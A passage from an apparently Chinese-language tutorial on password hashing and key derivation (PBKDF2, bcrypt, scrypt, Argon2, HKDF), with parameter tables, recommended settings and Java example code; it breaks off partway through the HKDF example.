        System.out.println(<span class="hljs-string">"\n=== 性能测试（不同迭代次数） ==="</span>);
        <span class="hljs-type">int</span>[] iterationsArray = {<span class="hljs-number">10000</span>, <span class="hljs-number">50000</span>, <span class="hljs-number">100000</span>, <span class="hljs-number">200000</span>};
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> iter : iterationsArray) {
            <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
            hashPassword(<span class="hljs-string">"test"</span>, iter);
            <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
            System.out.println(<span class="hljs-string">"迭代次数 "</span> + iter + <span class="hljs-string">": "</span> + (end - start) + <span class="hljs-string">"ms"</span>);
        }
    }
}
</code></pre>
<h3 data-id="heading-8">安全建议</h3>
<p>✅ <strong>推荐配置：</strong></p>
<ul>
<li>迭代次数：至少100000次（2024年）</li>
<li>Salt长度：至少128位</li>
<li>使用HMAC-SHA256而非SHA1</li>
</ul>
<p>⚠️ <strong>注意：</strong></p>
<ul>
<li>迭代次数应根据硬件性能调整（至少100ms计算时间）</li>
<li>定期增加迭代次数以适应硬件发展</li>
</ul>
<hr/>
<h2 data-id="heading-9">bcrypt</h2>
<h3 data-id="heading-10">原理</h3>
<p>bcrypt是基于Blowfish密码的密钥派生函数，专门设计用于密码哈希。通过"成本因子"控制计算复杂度。</p>
<h3 data-id="heading-11">技术规格</h3>

























<table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>成本因子</td><td>4-31（推荐10-12）</td></tr><tr><td>Salt长度</td><td>128位（自动生成）</td></tr><tr><td>输出长度</td><td>60字符（包含元数据）</td></tr><tr><td>轮数</td><td>2^成本因子</td></tr></tbody></table>
<h3 data-id="heading-12">应用场景</h3>
<ol start="0">
<li><strong>密码存储</strong>：广泛用于Web应用</li>
<li><strong>数据库密码</strong>：某些数据库系统</li>
<li><strong>系统认证</strong>：Unix/Linux系统</li>
</ol>
<h3 data-id="heading-13">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：慢（设计如此）</li>
<li><strong>内存占用</strong>：中等</li>
<li><strong>CPU使用率</strong>：高</li>
<li><strong>可调性</strong>：通过成本因子调整</li>
</ul>
<h3 data-id="heading-14">Java实现示例</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 需要使用第三方库，如jBCrypt或Spring Security</span>
​
<span class="hljs-keyword">import</span> org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
<span class="hljs-keyword">import</span> java.util.regex.Pattern;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCryptExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> BCryptPasswordEncoder encoder = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BCryptPasswordEncoder</span>(<span class="hljs-number">12</span>);
    
    <span class="hljs-comment">/**
     * 生成密码哈希
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">String</span> <span class="hljs-title">hashPassword</span><span class="hljs-params">(<span class="hljs-type">String</span> password)</span> </span>{
        <span class="hljs-keyword">return</span> encoder.<span class="hljs-built_in">encode</span>(password);
    }
    
    <span class="hljs-comment">/**
     * 验证密码
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title">verifyPassword</span><span class="hljs-params">(<span class="hljs-type">String</span> password, <span class="hljs-type">String</span> hash)</span> </span>{
        <span class="hljs-keyword">return</span> encoder.<span class="hljs-built_in">matches</span>(password, hash);
    }
    
    <span class="hljs-comment">/**
     * 使用自定义成本因子
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">String</span> <span class="hljs-title">hashPasswordWithStrength</span><span class="hljs-params">(<span class="hljs-type">String</span> password, <span class="hljs-type">int</span> strength)</span> </span>{
        BCryptPasswordEncoder customEncoder = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BCryptPasswordEncoder</span>(strength);
        <span class="hljs-keyword">return</span> customEncoder.<span class="hljs-built_in">encode</span>(password);
    }
    
    <span class="hljs-comment">/**
     * 检查哈希是否需要升级（成本因子增加）
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title">needsUpgrade</span><span class="hljs-params">(<span class="hljs-type">String</span> hash, <span class="hljs-type">int</span> minStrength)</span> </span>{
        <span class="hljs-comment">// bcrypt哈希格式：$2a$10$...</span>
        Pattern pattern = Pattern.<span class="hljs-built_in">compile</span>(<span class="hljs-string">"\$2[aby]?\$(\d+)\$"</span>);
        java.util.regex.Matcher matcher = pattern.<span class="hljs-built_in">matcher</span>(hash);
        <span class="hljs-keyword">if</span> (matcher.<span class="hljs-built_in">find</span>()) {
            <span class="hljs-type">int</span> strength = Integer.<span class="hljs-built_in">parseInt</span>(matcher.<span class="hljs-built_in">group</span>(<span class="hljs-number">1</span>));
            <span class="hljs-keyword">return</span> strength &lt; minStrength;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-type">String</span> password = <span class="hljs-string">"用户密码"</span>;
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"=== bcrypt密码哈希 ==="</span>);
        <span class="hljs-type">String</span> hash = <span class="hljs-built_in">hashPassword</span>(password);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"密码: "</span> + password);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"哈希: "</span> + hash);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"哈希长度: "</span> + hash.<span class="hljs-built_in">length</span>() + <span class="hljs-string">" 字符"</span>);
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n=== 密码验证 ==="</span>);
        <span class="hljs-type">boolean</span> isValid = <span class="hljs-built_in">verifyPassword</span>(password, hash);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"验证结果: "</span> + isValid);
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n=== 不同成本因子性能测试 ==="</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> strength = <span class="hljs-number">10</span>; strength &lt;= <span class="hljs-number">14</span>; strength++) {
            <span class="hljs-type">long</span> start = System.<span class="hljs-built_in">currentTimeMillis</span>();
            <span class="hljs-built_in">hashPasswordWithStrength</span>(password, strength);
            <span class="hljs-type">long</span> end = System.<span class="hljs-built_in">currentTimeMillis</span>();
            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"成本因子 "</span> + strength + <span class="hljs-string">": "</span> + (end - start) + <span class="hljs-string">"ms"</span>);
        }
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n=== 检查是否需要升级 ==="</span>);
        <span class="hljs-type">String</span> oldHash = <span class="hljs-built_in">hashPasswordWithStrength</span>(password, <span class="hljs-number">10</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"旧哈希需要升级: "</span> + <span class="hljs-built_in">needsUpgrade</span>(oldHash, <span class="hljs-number">12</span>));
    }
}
</code></pre>
<h3 data-id="heading-15">安全建议</h3>
<p>✅ <strong>推荐配置：</strong></p>
<ul>
<li>成本因子：12-14（2024年）</li>
<li>自动升级：检测旧哈希并升级</li>
</ul>
<p>⚠️ <strong>注意：</strong></p>
<ul>
<li>bcrypt输出包含Salt和成本因子</li>
<li>成本因子每增加1，时间翻倍</li>
</ul>
<hr/>
<h2 data-id="heading-16">scrypt</h2>
<h3 data-id="heading-17">原理</h3>
<p>scrypt设计用于抵抗硬件攻击（GPU、ASIC），通过同时使用CPU和内存资源提高安全性。</p>
<h3 data-id="heading-18">技术规格</h3>

























<table><thead><tr><th>参数</th><th>说明</th><th>推荐值</th></tr></thead><tbody><tr><td>N</td><td>CPU/内存成本</td><td>16384-32768</td></tr><tr><td>r</td><td>块大小参数</td><td>8</td></tr><tr><td>p</td><td>并行度</td><td>1-4</td></tr></tbody></table>
<h3 data-id="heading-19">应用场景</h3>
<ol start="0">
<li><strong>加密货币</strong>：某些币种使用</li>
<li><strong>高安全应用</strong>：需要抗GPU攻击</li>
<li><strong>密码存储</strong>：需要更高安全性</li>
</ol>
<h3 data-id="heading-20">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：很慢（设计如此）</li>
<li><strong>内存占用</strong>：高（N*r参数决定）</li>
<li><strong>CPU使用率</strong>：高</li>
<li><strong>抗攻击性</strong>：强（抗GPU/ASIC）</li>
</ul>
<h3 data-id="heading-21">Java实现示例</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 需要使用第三方库，如BouncyCastle</span>
​
<span class="hljs-keyword">import</span> org.bouncycastle.crypto.generators.SCrypt;
<span class="hljs-keyword">import</span> java.security.SecureRandom;
<span class="hljs-keyword">import</span> java.util.Base64;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SCryptExample</span> {
    
    <span class="hljs-comment">/**
     * scrypt密钥派生
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SCryptHash</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> hash;
        <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> salt;
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> N;
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> r;
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> p;
        
        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SCryptHash</span><span class="hljs-params">(<span class="hljs-type">String</span> hash, <span class="hljs-type">String</span> salt, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> p)</span> </span>{
            <span class="hljs-keyword">this</span>.hash = hash;
            <span class="hljs-keyword">this</span>.salt = salt;
            <span class="hljs-keyword">this</span>.N = N;
            <span class="hljs-keyword">this</span>.r = r;
            <span class="hljs-keyword">this</span>.p = p;
        }
    }
    
    <span class="hljs-comment">/**
     * 生成密码哈希
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> SCryptHash <span class="hljs-title">hashPassword</span><span class="hljs-params">(<span class="hljs-type">String</span> password, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> p)</span> </span>{
        <span class="hljs-comment">// 生成Salt</span>
        <span class="hljs-type">byte</span>[] salt = <span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[<span class="hljs-number">32</span>];
        SecureRandom random = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SecureRandom</span>();
        random.<span class="hljs-built_in">nextBytes</span>(salt);
        
        <span class="hljs-comment">// scrypt派生（输出256位）</span>
        <span class="hljs-type">byte</span>[] hash = SCrypt.<span class="hljs-built_in">generate</span>(
            password.<span class="hljs-built_in">getBytes</span>(),
            salt,
            N,      <span class="hljs-comment">// CPU/内存成本</span>
            r,      <span class="hljs-comment">// 块大小</span>
            p,      <span class="hljs-comment">// 并行度</span>
            <span class="hljs-number">32</span>      <span class="hljs-comment">// 输出长度（256位）</span>
        );
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">SCryptHash</span>(
            Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(hash),
            Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(salt),
            N, r, p
        );
    }
    
    <span class="hljs-comment">/**
     * 验证密码
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title">verifyPassword</span><span class="hljs-params">(<span class="hljs-type">String</span> password, SCryptHash stored)</span> </span>{
        <span class="hljs-type">byte</span>[] salt = Base64.<span class="hljs-built_in">getDecoder</span>().<span class="hljs-built_in">decode</span>(stored.salt);
        <span class="hljs-type">byte</span>[] hash = SCrypt.<span class="hljs-built_in">generate</span>(
            password.<span class="hljs-built_in">getBytes</span>(),
            salt,
            stored.N,
            stored.r,
            stored.p,
            <span class="hljs-number">32</span>
        );
        
        <span class="hljs-type">String</span> computedHash = Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(hash);
        <span class="hljs-keyword">return</span> computedHash.<span class="hljs-built_in">equals</span>(stored.hash);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-type">String</span> password = <span class="hljs-string">"用户密码"</span>;
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"=== scrypt密码哈希 ==="</span>);
        SCryptHash hash = <span class="hljs-built_in">hashPassword</span>(password, <span class="hljs-number">16384</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"密码: "</span> + password);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"N: "</span> + hash.N);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"r: "</span> + hash.r);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"p: "</span> + hash.p);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"Salt: "</span> + hash.salt);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"哈希: "</span> + hash.hash);
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n=== 密码验证 ==="</span>);
        <span class="hljs-type">boolean</span> isValid = <span class="hljs-built_in">verifyPassword</span>(password, hash);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"验证结果: "</span> + isValid);
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n=== 性能测试 ==="</span>);
        <span class="hljs-type">long</span> start = System.<span class="hljs-built_in">currentTimeMillis</span>();
        <span class="hljs-built_in">hashPassword</span>(password, <span class="hljs-number">16384</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>);
        <span class="hljs-type">long</span> end = System.<span class="hljs-built_in">currentTimeMillis</span>();
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"scrypt (N=16384): "</span> + (end - start) + <span class="hljs-string">"ms"</span>);
    }
}
</code></pre>
<h3 data-id="heading-22">安全建议</h3>
<p>✅ <strong>推荐配置：</strong></p>
<ul>
<li>N=16384, r=8, p=1（交互式登录）</li>
<li>N=32768, r=8, p=1（更高安全）</li>
<li>根据可用内存调整N和r</li>
</ul>
<p>⚠️ <strong>注意：</strong></p>
<ul>
<li>内存需求 = 128 * N * r 字节</li>
<li>内存不足会严重影响性能</li>
</ul>
<hr/>
<h2 data-id="heading-23">Argon2</h2>
<h3 data-id="heading-24">原理</h3>
<p>Argon2是密码哈希竞赛（PHC）的获胜者，提供三种变体：</p>
<ul>
<li><strong>Argon2d</strong>：抗GPU攻击</li>
<li><strong>Argon2i</strong>：抗侧信道攻击</li>
<li><strong>Argon2id</strong>：混合模式（推荐）</li>
</ul>
<h3 data-id="heading-25">技术规格</h3>






























<table><thead><tr><th>参数</th><th>说明</th><th>推荐值</th></tr></thead><tbody><tr><td>memory</td><td>内存成本（KB）</td><td>65536 (64MB)</td></tr><tr><td>iterations</td><td>迭代次数</td><td>3</td></tr><tr><td>parallelism</td><td>并行度</td><td>4</td></tr><tr><td>hashLength</td><td>输出长度</td><td>32字节</td></tr></tbody></table>
<h3 data-id="heading-26">应用场景</h3>
<ol start="0">
<li><strong>密码存储</strong>：现代应用首选</li>
<li><strong>高安全场景</strong>：需要抗各类攻击</li>
<li><strong>新项目</strong>：推荐使用Argon2</li>
</ol>
<h3 data-id="heading-27">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：慢（设计如此）</li>
<li><strong>内存占用</strong>：高（可配置）</li>
<li><strong>CPU使用率</strong>：高</li>
<li><strong>抗攻击性</strong>：最强</li>
</ul>
<h3 data-id="heading-28">Java实现示例</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 需要使用第三方库，如BouncyCastle</span>
​
<span class="hljs-keyword">import</span> org.bouncycastle.crypto.generators.Argon2BytesGenerator;
<span class="hljs-keyword">import</span> org.bouncycastle.crypto.params.Argon2Parameters;
<span class="hljs-keyword">import</span> java.security.SecureRandom;
<span class="hljs-keyword">import</span> java.util.Base64;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Argon2Example</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Argon2Hash</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> hash;
        <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> salt;
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> memory;
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> iterations;
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> parallelism;
        
        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Argon2Hash</span><span class="hljs-params">(<span class="hljs-type">String</span> hash, <span class="hljs-type">String</span> salt, <span class="hljs-type">int</span> memory, <span class="hljs-type">int</span> iterations, <span class="hljs-type">int</span> parallelism)</span> </span>{
            <span class="hljs-keyword">this</span>.hash = hash;
            <span class="hljs-keyword">this</span>.salt = salt;
            <span class="hljs-keyword">this</span>.memory = memory;
            <span class="hljs-keyword">this</span>.iterations = iterations;
            <span class="hljs-keyword">this</span>.parallelism = parallelism;
        }
    }
    
    <span class="hljs-comment">/**
     * Argon2id密码哈希（推荐）
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> Argon2Hash <span class="hljs-title">hashPassword</span><span class="hljs-params">(<span class="hljs-type">String</span> password, <span class="hljs-type">int</span> memory, <span class="hljs-type">int</span> iterations, 
                                          <span class="hljs-type">int</span> parallelism)</span> </span>{
        <span class="hljs-comment">// 生成Salt</span>
        <span class="hljs-type">byte</span>[] salt = <span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[<span class="hljs-number">16</span>];
        SecureRandom random = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SecureRandom</span>();
        random.<span class="hljs-built_in">nextBytes</span>(salt);
        
        <span class="hljs-comment">// Argon2id参数</span>
        Argon2Parameters.Builder builder = <span class="hljs-keyword">new</span> Argon2Parameters.<span class="hljs-built_in">Builder</span>(Argon2Parameters.ARGON2_id)
            .<span class="hljs-built_in">withSalt</span>(salt)
            .<span class="hljs-built_in">withMemoryAsKB</span>(memory)
            .<span class="hljs-built_in">withIterations</span>(iterations)
            .<span class="hljs-built_in">withParallelism</span>(parallelism);
        
        Argon2BytesGenerator generator = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Argon2BytesGenerator</span>();
        generator.<span class="hljs-built_in">init</span>(builder.<span class="hljs-built_in">build</span>());
        
        <span class="hljs-comment">// 生成哈希（256位）</span>
        <span class="hljs-type">byte</span>[] hash = <span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[<span class="hljs-number">32</span>];
        generator.<span class="hljs-built_in">generateBytes</span>(password.<span class="hljs-built_in">getBytes</span>(), hash);
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Argon2Hash</span>(
            Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(hash),
            Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(salt),
            memory,
            iterations,
            parallelism
        );
    }
    
    <span class="hljs-comment">/**
     * 验证密码
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title">verifyPassword</span><span class="hljs-params">(<span class="hljs-type">String</span> password, Argon2Hash stored)</span> </span>{
        <span class="hljs-type">byte</span>[] salt = Base64.<span class="hljs-built_in">getDecoder</span>().<span class="hljs-built_in">decode</span>(stored.salt);
        
        Argon2Parameters.Builder builder = <span class="hljs-keyword">new</span> Argon2Parameters.<span class="hljs-built_in">Builder</span>(Argon2Parameters.ARGON2_id)
            .<span class="hljs-built_in">withSalt</span>(salt)
            .<span class="hljs-built_in">withMemoryAsKB</span>(stored.memory)
            .<span class="hljs-built_in">withIterations</span>(stored.iterations)
            .<span class="hljs-built_in">withParallelism</span>(stored.parallelism);
        
        Argon2BytesGenerator generator = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Argon2BytesGenerator</span>();
        generator.<span class="hljs-built_in">init</span>(builder.<span class="hljs-built_in">build</span>());
        
        <span class="hljs-type">byte</span>[] hash = <span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[<span class="hljs-number">32</span>];
        generator.<span class="hljs-built_in">generateBytes</span>(password.<span class="hljs-built_in">getBytes</span>(), hash);
        
        <span class="hljs-type">String</span> computedHash = Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(hash);
        <span class="hljs-keyword">return</span> computedHash.<span class="hljs-built_in">equals</span>(stored.hash);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-type">String</span> password = <span class="hljs-string">"用户密码"</span>;
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"=== Argon2id密码哈希 ==="</span>);
        Argon2Hash hash = <span class="hljs-built_in">hashPassword</span>(password, <span class="hljs-number">65536</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"密码: "</span> + password);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"内存: "</span> + hash.memory + <span class="hljs-string">" KB"</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"迭代: "</span> + hash.iterations);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"并行度: "</span> + hash.parallelism);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"Salt: "</span> + hash.salt);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"哈希: "</span> + hash.hash);
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n=== 密码验证 ==="</span>);
        <span class="hljs-type">boolean</span> isValid = <span class="hljs-built_in">verifyPassword</span>(password, hash);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"验证结果: "</span> + isValid);
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n=== 不同配置性能测试 ==="</span>);
        <span class="hljs-type">int</span>[] memorySizes = {<span class="hljs-number">32768</span>, <span class="hljs-number">65536</span>, <span class="hljs-number">131072</span>};
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> mem : memorySizes) {
            <span class="hljs-type">long</span> start = System.<span class="hljs-built_in">currentTimeMillis</span>();
            <span class="hljs-built_in">hashPassword</span>(password, mem, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);
            <span class="hljs-type">long</span> end = System.<span class="hljs-built_in">currentTimeMillis</span>();
            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"内存 "</span> + mem + <span class="hljs-string">" KB: "</span> + (end - start) + <span class="hljs-string">"ms"</span>);
        }
    }
}
</code></pre>
<h3 data-id="heading-29">安全建议</h3>
<p>✅ <strong>推荐配置：</strong></p>
<ul>
<li><strong>Argon2id</strong>：混合模式，推荐</li>
<li>内存：64MB（65536 KB）</li>
<li>迭代次数：3</li>
<li>并行度：4</li>
<li>输出长度：32字节</li>
</ul>
<p>⚠️ <strong>注意：</strong></p>
<ul>
<li>内存和并行度可根据服务器资源调整</li>
<li>交互式登录建议100-500ms计算时间</li>
</ul>
<hr/>
<h2 data-id="heading-30">HKDF</h2>
<h3 data-id="heading-31">原理</h3>
<p>HKDF (HMAC-based Key Derivation Function) 用于从主密钥派生多个子密钥。包括提取（Extract）和扩展（Expand）两个阶段。</p>
<h3 data-id="heading-32">技术规格</h3>





















<table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>输入</td><td>主密钥 + Salt（可选）</td></tr><tr><td>输出</td><td>可变长度子密钥</td></tr><tr><td>算法</td><td>HMAC-SHA256/512</td></tr></tbody></table>
<h3 data-id="heading-33">应用场景</h3>
<ol start="0">
<li><strong>密钥派生</strong>：从主密钥派生多个子密钥</li>
<li><strong>TLS</strong>：密钥派生</li>
<li><strong>密钥分层</strong>：密钥管理系统</li>
</ol>
<h3 data-id="heading-34">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：快</li>
<li><strong>内存占用</strong>：低</li>
<li><strong>CPU使用率</strong>：低</li>
</ul>
<h3 data-id="heading-35">Java实现示例</h3>
<pre><code class="hljs language-ini" lang="ini">import javax.crypto.Mac<span class="hljs-comment">;</span>
import javax.crypto.spec.SecretKeySpec<span class="hljs-comment">;</span>
import java.security.SecureRandom<span class="hljs-comment">;</span>
​
public class HKDFExample {
    
    /**
     * HKDF提取阶段
     */
    private static byte<span class="hljs-section">[]</span> extract(byte<span class="hljs-section">[]</span> salt, byte<span class="hljs-section">[]</span> inputKeyMaterial) throws Exception {
        Mac <span class="hljs-attr">mac</span> = Mac.getInstance(<span class="hljs-string">"HmacSHA256"</span>)<span class="hljs-comment">;</span>
        SecretKeySpec <span class="hljs-attr">keySpec</span> = new SecretKeySpec(salt, <span class="hljs-string">"HmacSHA256"</span>)<span class="hljs-comment">;</span>
        mac.init(keySpec)<span class="hljs-comment">;</span>
        return mac.doFinal(inputKeyMaterial)<span class="hljs-comment">;</span>
    }
    
    /**
     * HKDF扩展阶段
     */
    private static byte<span class="hljs-section">[]</span> expand(byte<span class="hljs-section">[]</span> prk, byte<span class="hljs-section">[]</span> info, int length) throws Exception {
        Mac <span class="hljs-attr">mac</span> = Mac.getInstance(<span class="hljs-string">"HmacSHA256"</span>)<span class="hljs-comment">;</span>
        SecretKeySpec <span class="hljs-attr">keySpec</span> = new SecretKeySpec(prk, <span class="hljs-string">"HmacSHA256"</span>)<span class="hljs-comment">;</span>
        mac.init(keySpec)<span class="hljs-comment">;</span>
        
        byte<span class="hljs-section">[]</span> <span class="hljs-attr">output</span> = new byte[length]<span class="hljs-comment">;</span>
        byte<span class="hljs-section">[]</span> <span class="hljs-attr">t</span> = new byte[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span>
        int <span class="hljs-attr">offset</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        int <span class="hljs-attr">counter</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        
        while (offset &lt; length) {
            mac.update(t)<span class="hljs-comment">;</span>
            mac.update(info)<span class="hljs-comment">;</span>
            mac.update((byte) counter)<span class="hljs-comment">;</span>
            <span class="hljs-attr">t</span> = mac.doFinal()<span class="hljs-comment">;</span>
            
            int <span class="hljs-attr">toCopy</span> = Math.min(t.length, length - <span class="hljs-literal">off</span>set)<span class="hljs-comment">;</span>
            System.arraycopy(t, 0, output, offset, toCopy)<span class="hljs-comment">;</span>
            offset += toCopy<span class="hljs-comment">;</span>
            counter++<span class="hljs-comment">;</span>
        }
        
        return output<span class="hljs-comment">;</span>
    }
    
    /**
     * HKDF完整流程
     */
    public static byte<span class="hljs-section">[]</span> derive(byte<span class="hljs-section">[]</span> inputKeyMaterial, byte<span class="hljs-section">[]</span> salt, byte<span class="hljs-section">[]</span> info, int length) 
            throws Exception {
        // 如果没有提供Salt，使用全零
        if (<span class="hljs-attr">salt</span> == null || salt.length == <span class="hljs-number">0</span>) {
            <span class="hljs-attr">salt</span> = new byte[<span class="hljs-number">32</span>]<span class="hljs-comment">; // 256位全零</span>
        }
        
        // 提取阶段
        byte<span class="hljs-section">[]</span> <span class="hljs-attr">prk</span> = extract(salt, inputKeyMaterial)<span class="hljs-comment">;</span>
        
        // 扩展阶段
        return expand(prk, info, length)<span class="hljs-comment">;</span>
    }
    
    /**
     * 派生多个密钥
     */
    public static byte<span class="hljs-section">[]</span><span class="hljs-section">[]</span> deriveMultipleKeys(byte<span class="hljs-section">[]</span> masterKey, int keyCount, int keyLength) 
            throws Exception {
        byte<span class="hljs-section">[]</span><span class="hljs-section">[]</span> <span class="hljs-attr">keys</span> = new byte[keyCount][]<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; keyCount; i++) {</span>
            byte<span class="hljs-section">[]</span> <span class="hljs-attr">info</span> = (<span class="hljs-string">"key-"</span> + i).getBytes()<span class="hljs-comment">;</span>
            keys<span class="hljs-section">[i]</span> = derive(masterKey, null, info, keyLength)<span class="hljs-comment">;</span>
        }
        return keys<span class="hljs-comment">;</span>
    }
    
    public static void main(String<span class="hljs-section">[]</span> args) throws Exception {
        // 生成主密钥
        byte<span class="hljs-section">[]</span> <span class="hljs-attr">masterKey</span> = new byte[<span class="hljs-number">32</span>]<span class="hljs-comment">;</span>
